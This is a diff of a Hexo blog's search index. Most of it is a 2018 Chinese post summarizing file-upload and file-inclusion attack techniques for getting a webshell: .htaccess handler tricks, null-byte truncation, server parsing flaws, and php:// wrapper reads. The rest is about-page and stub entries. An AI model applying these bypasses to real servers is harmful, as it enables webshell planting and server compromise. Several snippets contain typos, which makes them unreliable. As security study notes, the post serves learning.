-    <content type="text"><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[categories]]></title>
-    <url>%2Fcategories%2Findex.html</url>
-    <content type="text"><![CDATA[hi,man]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[tags]]></title>
-    <url>%2Ftags%2Findex.html</url>
-    <content type="text"></content>
-  </entry>
-  <entry>
-    <title><![CDATA[about]]></title>
-    <url>%2Fabout%2Findex.html</url>
-    <content type="text"><![CDATA[本着分享即学习的原则，本菜最近新搭建了博客。（⊙.⊙） 一方面是记录一下平时学习中遇到一些问题和想法；另一方面算是激励自己学习的一个动力。(ง •̀_•́)ง (*•̀ㅂ•́)و 如有错误还请各位师傅批评指正。(´･◡･`)]]></content>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> AWD </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>文件上传常规漏洞总结</title>
+      <link href="/2018/04/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
+      <url>/2018/04/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
+      <content type="html"><![CDATA[<h3 id="从文件上传到getshell"><a href="#从文件上传到getshell" class="headerlink" title="从文件上传到getshell"></a>从文件上传到getshell</h3><p>一般找到文件上传页面，常规getshell思路:<br>先检查服务器验证上传文件的逻辑，再想办法绕过</p><blockquote><ul><li>前台js验证——禁用js，burpsuit抓包绕过即可</li><li>后台检查MIME——抓包改MIME</li><li>后台文件内容检测——(一般是用GetImageSize函数) 制作图片马上传</li><li>.hatccess上传(apache)——创建一个.hatccseea文件<br>设置命名有”php.gif”的文件当作php文件解析执行：<pre><code>&lt;FilesMatch “php.gif”&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre>上传的jpg文件都会以php格式解析：<pre><code>AddType    application/x-httpd-php    .jpg</code></pre></li></ul></blockquote><blockquote><ul><li>后台检查文件后缀名——</li><li>0x00截断上传 (php版本小于5.3.4，php的magic_quotes_gpc为OFF)<pre><code>1.php .png(空格改为00)</code></pre></li><li>IIS6.0解析漏洞<pre><code>文件      xxx.asp;.jpg (服务器默认不解析;号后面的内容)文件夹    xxx.asp/xxx.jpg (服务器默认会把.asp，.asp目录下的文件都解析成asp文件)</code></pre></li><li>apache解析漏洞<pre><code>www.xxx.com/logo.jpg.php.xxx(遇到不识别的后缀名向前解析)</code></pre></li><li>iis7.0和nginx解析漏洞<pre><code>www.xxx.com/logo.jpg/*.php(开启fix_pathinfo)</code></pre></li></ul></blockquote><h3 id="文件包含漏洞和利用"><a href="#文件包含漏洞和利用" class="headerlink" title="文件包含漏洞和利用"></a>文件包含漏洞和利用</h3><blockquote><ul><li>如果php脚本中使用了include,include_once,reqiure,requier_once这四个函数，并且函数的参数是用户可以控制的，就能造成文件包含漏洞</li><li>通常的include函数中，就算是可以控制参数但是后缀名也大多被限制，例如include($file.’.txt’)这样就只能包含txt文件。这时我们可以结合%00截断包含任意文件。index.php%00</li><li>文件包含漏洞也可以结合php伪协议，例如php://,phar://等等(php://input甚至可以写入木马)。例如文件包含进来但是无法显示时，可以用伪协议读文件的源码(php://filter/read=convert.base64-encode/resourse=包含文件)</li></ul></blockquote>]]></content>
+      
+      <categories>
+          
+          <category> 文件上传 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 文件上传 </tag>
+            
+            <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+  
+  
+    
+    <entry>
+      <title></title>
+      <link href="/404.html"/>
+      <url>/404.html</url>
+      <content type="html"><![CDATA[<!DOCTYPE HTML><html><head>  <meta http-equiv="content-type" content="text/html;charset=utf-8;">  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">  <meta name="robots" content="all">  <meta name="robots" content="index,follow">  <link rel="stylesheet" type="text/css" href="https://qzone.qq.com/gy/404/style/404style.css"></head><body>  <script type="text/plain" src="http://www.qq.com/404/search_children.js" charset="utf-8" homepageurl="/" homepagename="回到我的主页">  </script>  <script src="https://qzone.qq.com/gy/404/data.js" charset="utf-8"></script>  <script src="https://qzone.qq.com/gy/404/page.js" charset="utf-8"></script></body></html>]]></content>
+    </entry>
+    
+    <entry>
+      <title>about</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
+      <content type="html"><![CDATA[<p>本着分享即学习的原则，本菜最近新搭建了博客。（⊙.⊙）</p><p>一方面是记录一下平时学习中遇到一些问题和想法；另一方面算是激励自己学习的一个动力。(ง •̀_•́)ง (*•̀ㅂ•́)و</p><p>如有错误还请各位师傅批评指正。(´･◡･`)</p>]]></content>
+    </entry>
+    
+    <entry>
+      <title>tags</title>
+      <link href="/tags/index.html"/>
+      <url>/tags/index.html</url>
+      <content type="html"><![CDATA[]]></content>
+    </entry>
+    
+    <entry>
+      <title>categories</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
+      <content type="html"><![CDATA[<p>hi,man</p>]]></content>
+    </entry>
+    
+  
 </search>
